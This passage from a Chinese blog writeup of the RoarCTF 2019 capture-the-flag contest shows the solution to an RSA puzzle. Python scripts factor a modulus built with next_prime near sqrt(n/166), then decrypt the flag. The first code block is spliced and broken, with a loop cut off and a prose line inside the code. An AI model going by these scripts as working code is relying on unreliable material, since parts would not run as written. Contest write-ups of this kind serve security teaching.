+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x3D;(((y%x)**5)%(x%y))**2019+y**316+(y+1)&#x2F;x</span><br><span class="line">p&#x3D;next_prime(z*x*y)</span><br><span class="line">q&#x3D;next_prime(z)</span><br><span class="line">n&#x3D;p*q</span><br></pre></td></tr></table></figure>
+
+<p>直接爆破A方程可得 x*y=166。（一个是2一个是83，懒得重新写脚本了很好爆。）</p>
+<p>然后可得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p&#x3D;next_prime(z*166)</span><br><span class="line">q&#x3D;next_prime(z)</span><br></pre></td></tr></table></figure>
+
+<p>可以推断出，n和z<em>z</em>166的值相对来说是距离比较近的，根据next_prime可以推测出sqrt(n/166)的值和p和q的其中一个是很接近的，爆破即可。</p>
+<p>py2 ：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span></span><br><span class="line"><span class="comment">#m是n/166的开放根，和p q 中的一个距离很近</span></span><br><span class="line">m=sympy.nextprime(<span class="number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458029</span>)</span><br><span class="line">m2=<span class="number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458029</span>*<span class="number">166</span></span><br><span class="line">k=m</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">q=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (m&gt;<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span>(n%m==<span class="number">0</span>):</span><br><span class="line">        <span class="comment">#print (m) A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x</span></span><br><span class="line">根据方程可以直接算出x和y</span><br><span class="line">a=<span class="number">2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724</span></span><br><span class="line">x=<span class="number">1</span></span><br><span class="line">y=<span class="number">1</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line">c=<span class="number">0</span></span><br><span class="line">d=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">   <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">100</span>):</span><br><span class="line">       c=(y+<span class="number">1</span>)/x</span><br><span class="line">       d=x%y</span><br><span class="line">       <span class="keyword">if</span>(d!=<span class="number">0</span>):</span><br><span class="line">           n=(((y%x)**<span class="number">5</span>)%d)**<span class="number">2019</span>+y**<span class="number">316</span>+c</span><br><span class="line">       <span class="keyword">if</span>(n==a):</span><br><span class="line">            <span class="keyword">print</span> (x)</span><br><span class="line">            <span class="keyword">print</span> (y)</span><br></pre></td></tr></table></figure>
+
+<p>可得x=2 y=83</p>
+<p>p=next_prime(z<em>x</em>y)</p>
+<p>q=next_prime(z)</p>
+<p>n=q*p</p>
+<p>因此可以猜测n和（z<em>x</em>y）<em>z的值也是很接近的，也就是n和z^2</em>166是很接近的，那么sqrt(n/166)和q是很接近的。所以从sqrt(n/166)附近查找prime。</p>
+<p>e是未知的，但是e的取值范围相对是小的，直接猜或者爆破，结果可知e为65537.</p>
+<p>解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">n=<span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span></span><br><span class="line"><span class="comment">#m即是sqrt(n/166)的近似值</span></span><br><span class="line">m=sympy.nextprime(<span class="number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458029</span>)</span><br><span class="line">c=<span class="number">86974685960185109994565885227776590430584975317324687072143606337834618757975096133503732246558545817823508491829181296701578862445122140544748432956862934052663959903364809344666885925501943806009045214347928716791730159539675944914294533623047609564608561054087106518420308176681346465904692545308790901579479104745664756811301111441543090132246542129700485721093162972711529510721321996972649182594310700996042178757282311887765329548031672904349916667094862779984235732091664623511790424370705655016549911752412395937963400908229932716593592702387850259325784109798223415344586624970470351548381110529919234353</span></span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">q=<span class="number">0</span></span><br><span class="line"><span class="comment">#从m附近查找q或p</span></span><br><span class="line"><span class="keyword">while</span>(m&gt;<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span>(n%m==<span class="number">0</span>):</span><br><span class="line">        p=m</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"p="</span></span><br><span class="line">        <span class="keyword">print</span> p</span><br><span class="line">        q=n/p</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"q="</span> </span><br><span class="line">        <span class="keyword">print</span> q</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    m=sympy.nextprime(m)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a,m)</span>:</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">" error"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line">e=<span class="number">1</span></span><br><span class="line">d=<span class="number">0</span></span><br><span class="line"><span class="comment">#爆破e</span></span><br><span class="line"><span class="keyword">while</span>(e&lt;<span class="number">100000</span>):</span><br><span class="line">    <span class="comment">#try:</span></span><br><span class="line">    <span class="comment">#e=sympy.nextprime(e)</span></span><br><span class="line">    e=<span class="number">65537</span> <span class="comment">#最后爆破成功的e</span></span><br><span class="line">    d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">    m=pow(c,d,n)</span><br><span class="line">    <span class="keyword">print</span> long_to_bytes(m)</span><br><span class="line">    m_hex = hex(m)[<span class="number">2</span>:]</span><br><span class="line">   <span class="comment"># try:    </span></span><br><span class="line">    <span class="keyword">print</span> m_hex</span><br><span class="line">    print(<span class="string">"ascii:\n%s"</span>%(binascii.a2b_hex(m_hex).decode(<span class="string">"utf8"</span>),))</span><br><span class="line">   <span class="comment"># except:</span></span><br><span class="line">    <span class="comment">#    if(e%10000==0):</span></span><br><span class="line">     <span class="comment">#       print e</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015200106-77a6a3e8-ef43-1.png" alt></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://Qftm.github.io">Qftm</a>
+            <p>原文链接：<a href="http://qftm.github.io/2019/10/27/RoarCTF2019-Writeup/">http://qftm.github.io/2019/10/27/RoarCTF2019-Writeup/</a>
+            <p>发表日期：<a href="http://qftm.github.io/2019/10/27/RoarCTF2019-Writeup/">October 27th 2019, 12:08:00 am</a>
+            <p>更新日期：<a href="http://qftm.github.io/2019/10/27/RoarCTF2019-Writeup/">April 20th 2020, 12:05:23 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/10/27/Kali-Rolling-2019/" title= "Kali Rolling 2019 系统配置总结（Updateing）">
+                    <div class="nextTitle">Kali Rolling 2019 系统配置总结（Updateing）</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/10/26/Joomla3.4.6-RCE-analyze/" title= "Joomla3.4.6 RCE漏洞深度分析">
+                    <div class="prevTitle">Joomla3.4.6 RCE漏洞深度分析</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:Qftmbin@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Qftm" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//twitter.com/Qftmer" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#签到题"><span class="toc-number">1.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黄金六年"><span class="toc-number">1.2.</span> <span class="toc-text">黄金六年</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#forensic"><span class="toc-number">1.3.</span> <span class="toc-text">forensic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThankGame"><span class="toc-number">1.4.</span> <span class="toc-text">ThankGame</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-upload"><span class="toc-number">2.1.</span> <span class="toc-text">simple_upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-calc"><span class="toc-number">2.2.</span> <span class="toc-text">easy_calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-java"><span class="toc-number">2.3.</span> <span class="toc-text">easy_java</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">3.</span> <span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#polyre"><span class="toc-number">3.1.</span> <span class="toc-text">polyre</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-op"><span class="toc-number">4.1.</span> <span class="toc-text">ez_op</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyrsa"><span class="toc-number">5.1.</span> <span class="toc-text">babyrsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#区块链1"><span class="toc-number">5.2.</span> <span class="toc-text">区块链1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#智能合约2"><span class="toc-number">5.3.</span> <span class="toc-text">智能合约2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rsa"><span class="toc-number">5.4.</span> <span class="toc-text">rsa</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 62
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2020/04/19/bypass-nodejs-jwt/" >探索Node.js中JWT认证缺陷的绕过</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/03</span><a class="archive-post-title" href= "/2020/04/03/php-filter-tricks/" >探索php://filter在实战当中的奇技淫巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href= "/2020/03/25/Linux-Network-Protocol-Stack/" >Linux Network Protocol Stack</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2020/03/23/Software-Engineering-Learning-Handbook/" >Software Engineering Learning Handbook</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href= "/2020/03/22/Socket-Learning-Handbook/" >Socket Programming Learning Handbook</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href= "/2020/03/18/PHP-File-Inclusion-Exploiting-and-Bypass/" >PHP File Inclusion Bug Exploiting and Bypass Handbook</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/" >LFI PHPINFO OR PHP7 Segment Fault Getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/" >LFI Bypass Session Restriction Getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/Linux-Electronic-Forensics/" >Linux Electronic Forensics Learning Handbook</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2020/03/06/bypass-rfi-by-webdav/" >RFI巧用WebDAV绕过URL包含限制Getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href= "/2020/03/01/apple-icloud-credential-stealing/" >Apple iCloud 凭证的窃取分析 -【CVE-2020-3841】</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/12</span><a class="archive-post-title" href= "/2020/02/12/Hackintosh-Of-Lenovo-R720-15IKBN/" >Hackintosh Of Lenovo R720 15IKBN</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2020/01/18/Information-Collection-Handbook/" >Information Collection Handbook</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/03</span><a class="archive-post-title" href= "/2020/01/03/small-and-medium-sized-enterprise-ips-deployment/" >中小型企业级 IPS 部署</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/2020/01/01/small-and-medium-sized-enterprise-firewall-deployment/" >中小型企业级防火墙部署</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/31</span><a class="archive-post-title" href= "/2019/12/31/Docker-Learning-Handbook/" >Docker Learning Handbook</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2019/11/22/PhpStudyBackDoor2019/" >PhpStudy BackDoor2019 深度分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2019/10/27/Kali-Rolling-2019/" >Kali Rolling 2019 系统配置总结（Updateing）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2019/10/27/RoarCTF2019-Writeup/" >楼上请让路 RoarCTF2019 Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2019/10/26/Joomla3.4.6-RCE-analyze/" >Joomla3.4.6 RCE漏洞深度分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/30</span><a class="archive-post-title" href= "/2019/09/30/pe-structure/" >初识PE文件结构</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span><a class="archive-post-title" href= "/2019/09/19/information-hiding-and-detection-based-on-bmp-image/" >基于BMP图像的信息隐藏与检测</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/14</span><a class="archive-post-title" href= "/2019/09/14/matlab-image-and-audio-signal-processing/" >MATLAB之图像与音频信号处理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/2019/09/12/matlab-basic-syntax-and-functions/" >MATLAB之基本语法与基础函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2019/09/11/CVE-2018-14418-shines-a-new-spark/" >CVE-2018-14418 擦出新火花</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2019/09/05/Electronic-Forensics-1/" >浅谈电子数字取证技术</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2019/08/03/Linux-Reverse-Shell/" >Linux 反弹 Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2019/08/03/Windows-Reverse-Shell/" >Windows 反弹 Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2019/08/03/AWD-Bugs-Fix/" >AWD攻防赛之各类漏洞FIX方案</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/2019/08/01/ISCC2019-Finals-Writeup/" >第16届(2019)全国大学生信息安全与对抗技术竞赛全国线下总决赛 Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/2019/07/31/Hack-The-Box-Web-Pentest-2017/" >Hack The Box Web Pentest 2017</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2019/07/30/Hack-The-Box-Web-Pentest-2019/" >Hack The Box Web Pentest 2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/15</span><a class="archive-post-title" href= "/2019/05/15/bypass-rfi-by-samba/" >RFI巧用Samba绕过URL包含限制Getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2019/05/12/Linux-DNS-server-configuration-and-management/" >Linux DNS 服务器配置与管理</a>
